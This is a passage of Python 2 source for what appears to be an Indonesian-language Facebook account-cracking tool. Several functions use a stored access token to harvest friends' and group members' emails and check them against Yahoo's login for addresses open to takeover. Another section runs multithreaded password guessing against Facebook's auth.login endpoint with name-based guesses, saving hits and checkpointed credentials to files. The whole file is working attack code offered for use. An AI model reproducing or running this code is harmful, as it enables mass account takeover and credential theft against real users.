		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 43*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
					save = open('out/TemanMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/TemanMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	id=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
					save = open('out/GrupMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	

def clone_dari_file():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	files = raw_input("\033[1;96m[+] \033[1;93mNama File \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mFile tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	mpsh = []
	jml = 0
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				print("\033[1;96m[✓] \033[1;92mVULN")
				print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
				save = open('out/MailVuln.txt','a')
				save.write("Email: "+ mail + '\n\n')
				save.close()
				berhasil.append(mail)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
####BANGLA####
def pilih_bangla():
	reak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if reak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_bangla()
	elif reak =="1" or reak == "01":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif reak =="2" or reak == "02":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print " \033[1;94m    ××× \033[1;97mCRACK BANGLADESH/PAKISTAN \033[1;94m××× "
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		dok = raw_input("\033[1;97m{\033[1;94m+\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+dok+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;94m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;94m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n[ Back ]")
			bangla()
		except requests.exceptions.ConnectionError:
			print"[!] Try Again !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+dok+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif reak =="3" or reak == "03":
		os.system('clear')
		print logo
		try:
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;94m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mBack \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;93m[ \033[1;97mBack \033[1;93m]')
			bangla()
	elif reak =="0" or reak == "00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_bangla()
	
	print "\033[1;97m{\033[1;94m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;94m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;94m•\033[1;97m} Crack Walk "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
#####MAIN_BANGLADESH#####
	def main(arg):
		global cpe,oke
		ubd = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+ubd+'/?access_token='+toket)
			x = json.loads(a.text)
			bos1 = x['first_name']+'123'
			data1 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			naga1 = json.load(data1)
			if 'access_token' in naga1:
				print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos1
				oke.append(ubd+bos1)
			else:
				if 'www.facebook.com' in naga1['error_msg']:
					print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos1
					cek = open("out/pakisbang.txt", "a")
					cek.write("ID:" +ubd+ " Pw:" +bos1+"\n")
					cek.close()
					cpe.append(ubd+bos1)
				else:
					bos2 = x['first_name']+'1234'
					data2 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					naga2 = json.load(data2)
					if 'access_token' in naga2:
						print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos2
						oke.append(ubd+bos2)
					else:
						if 'www.facebook.com' in naga2['error_msg']:
							print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos2
							cek = open("out/pakisbang.txt", "a")
							cek.write("ID:" +ubd+ " Pw:" +bos2+"\n")
							cek.close()
							cpe.append(ubd+bos2)
						else:
							bos3 = x['first_name']+'12345'
							data3 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							naga3 = json.load(data3)
							if 'access_token' in naga3:
								print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos3
								oke.append(ubd+bos3)
							else:
								if 'www.facebook.com' in naga3['error_msg']:
									print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos3
									cek = open("out/pakisbang.txt", "a")
									cek.write("ID:" +ubd+ " Pw:" +bos3+"\n")
									cek.close()
									cpe.append(ubd+bos3)
								else:
									bos4 = '786786'
									data4 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									naga4 = json.load(data4)
									if 'access_token' in naga4:
										print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos4
										oke.append(ubd+bos4)
									else:
										if 'www.facebook.com' in naga4['error_msg']:
											print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos4
											cek = open("out/pakisbang.txt", "a")
											cek.write("ID:" +ubd+ " Pw:" +bos4+"\n")
											cek.close()
											cpe.append(ubd+bos4)
										else:
											bos5 = x['first_name']+'786'
											data5 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											naga5 = json.load(data5)
											if 'access_token' in naga5:
												print '\033[1;92m[Succes] '+ubd+' ❂ '+bos5
												oke.append(ubd+bos5)
											else:
												if 'www.facebook.com' in naga5['error_msg']:
													print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos5
													cek = open("out/pakisbang.txt", "a")
													cek.write("ID:" +ubd+ " Pw:" +bos5+"\n")
													cek.close()
													cpe.append(ubd+bos5)
												else:
													bos6 = x['last_name']+'123'
													data6 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													naga6 = json.load(data6)
													if 'access_token' in naga6:
														print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos6
														oke.append(ubd+bos6)
													else:
														if 'www.facebook.com' in naga6['error_msg']:
															print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos6
															cek = open("out/pakisbang.txt", "a")
															cek.write("ID:" +ubd+ " Pw:" +bos6+"\n")
															cek.close()
															cpe.append(ubd+bos6)
														else:
															bos7 = x['last_name']+'1234'
															data7 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															naga7 = json.load(data7)
															if 'access_token' in naga7:
																print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos7
																oke.append(ubd+bos7)
															else:
																if 'www.facebook.com' in naga7['error_msg']:
																	print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos7
																	cek = open("out/pakisbang.txt", "a")
																	cek.write("ID:" +ubd+ " Pw:" +bos7+"\n")
																	cek.close()
																	cpe.append(ubd+bos7)
																else:
																	bos8 = 'Pakistan'
																	data8 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	naga8 = json.load(data8)
																	if 'access_token' in naga8:
																		print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos8
																		oke.append(ubd+bos8)
																	else:
																		if 'www.facebook.com' in naga8['error_msg']:
																			print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ ' +bos8
																			cek = open("out/pakisbang.txt", "a")
																			cek.write("ID:" +ubd+ " Pw:" +bos8+"\n")
																			cek.close()
																			cpe.append(ubd+bos8)
																		else:
																			bos9 = x['last_name']+'786'
																			data9 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			naga9 = json.load(data9)
																			if 'access_token' in naga9:
																				print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos9
																				oke.append(ubd+bos9)
																			else:
																				if 'www.facebook.com' in naga9['error_msg']:
																					print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ ' +bos9
																					cek = open("out/pakisbang.txt", "a")
																					cek.write("ID:" +ubd+ " Pw:" +bos9+"\n")
																					cek.close()
																					cpe.append(ubd+bos9)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print '\033[1;97m[\033[1;94m✓\033[1;97m] \033[1;97mFinish....'
	print"\033[1;97m[\033[1;94m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;94mCP \033[1;97m: \033[1;92m"+str(len(oke))+"\033[1;97m/\033[1;94m"+str(len(cpe))
	print '\033[1;97m[\033[1;94m!\033[1;97m] \033[1;97mCP file saved : out/pakisbang.txt'
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	raw_input("\033[1;93m[\033[1;97m Back \033[1;93m]")
	os.system("python2 cek.py")
	
       
		
if __name__ == '__main__':
	menu()
	masuk()
